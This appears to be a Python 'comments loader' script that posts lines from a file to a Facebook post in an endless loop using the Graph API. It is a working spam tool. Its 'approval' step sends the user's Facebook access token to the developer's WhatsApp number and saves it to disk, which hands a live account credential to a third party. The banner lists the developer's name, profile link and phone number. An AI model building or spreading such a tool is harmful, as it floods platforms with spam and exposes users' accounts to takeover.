import os
import time
import requests

APPROVED_TOKENS_FILE = "approved_tokens.txt"
COMMENTS_FILE = "comments.txt"
DELAY_SECONDS = 10  # Adjustable delay between comments

def print_indian_logo():
    os.system("clear")
    print("\033[91m██╗███╗   ██╗██████╗ ██╗ █████╗ ███╗   ██╗\033[0m")
    print("\033[93m██║████╗  ██║██╔══██╗██║██╔══██╗████╗  ██║\033[0m")
    print("\033[92m██║██╔██╗ ██║██║  ██║██║███████║██╔██╗ ██║\033[0m")
    print("\033[96m██║██║╚██╗██║██║  ██║██║██╔══██║██║╚██╗██║\033[0m")
    print("\033[94m██║██║ ╚████║██████╔╝██║██║  ██║██║ ╚████║\033[0m")
    print("\033[95m╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝\033[0m\n")

def print_info():
    print("\033[91m< INFORMATION >\033[0m")
    print(f"\033[91m[•] DEVELOPER     ➤ \033[92mAyush \033[96mRawat\033[0m")
    print(f"\033[94m[•] FACEBOOK      ➤ https://facebook.com/ayush1043\033[0m")
    print(f"\033[92m[•] WHATSAPP      ➤ +918115048433\033[0m")
    print(f"\033[95m[•] VERSION       ➤ 1.0.0\033[0m")
    print(f"\033[93m[•] TOOL'S NAME   ➤ COMMENTS LOADER\n\033[0m")
    print("\033[96m< YOUR INFO >\033[0m")
    print(f"\033[96m[•] TODAY TIME    ➤", time.strftime("%I:%M %p"))
    print(f"\033[96m[•] TODAY DATE    ➤", time.strftime("%d/%B/%Y"))
    print("\033[96m[•] YOUR COUNTRY  ➤ IN\033[0m\n")

def is_token_approved(token):
    if not os.path.exists(APPROVED_TOKENS_FILE):
        return False
    with open(APPROVED_TOKENS_FILE, "r") as f:
        approved = f.read().splitlines()
    return token in approved

def send_to_whatsapp(token):
    msg = f"👋 Hello, this is my token:\n{token}\nPlease approve it."
    encoded_msg = requests.utils.quote(msg)
    whatsapp_url = f"https://wa.me/918115048433?text={encoded_msg}"
    print("\n📩 Opening WhatsApp for approval request...")
    os.system(f'am start "{whatsapp_url}"')
    print("\n⛔ Waiting for manual approval... Re-run this script after approval.")

def post_comment(token, post_id, comment):
    url = f"https://graph.facebook.com/{post_id}/comments"
    payload = {"message": comment, "access_token": token}
    res = requests.post(url, data=payload)
    if res.status_code == 200:
        print(f"✅ Sent: {comment}")
    else:
        print(f"❌ Failed: {comment} | {res.text}")

def load_comments():
    if not os.path.exists(COMMENTS_FILE):
        print(f"⚠️ File not found: {COMMENTS_FILE}")
        return []
    with open(COMMENTS_FILE, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

def main():
    print_indian_logo()
    print_info()

    token = input("🔑 Enter your EAAB Token: ").strip()

    if is_token_approved(token):
        post_id = input("🆔 Enter Facebook Post ID: ").strip()
        comments = load_comments()
        if not comments:
            print("⚠️ No comments found.")
            return
        while True:
            for c in comments:
                post_comment(token, post_id, c)
                time.sleep(DELAY_SECONDS)
    else:
        send_to_whatsapp(token)
        # Save token for manual approval later
        with open("pending_token.txt", "w") as f:
            f.write(token)

if __name__ == "__main__":
    main()
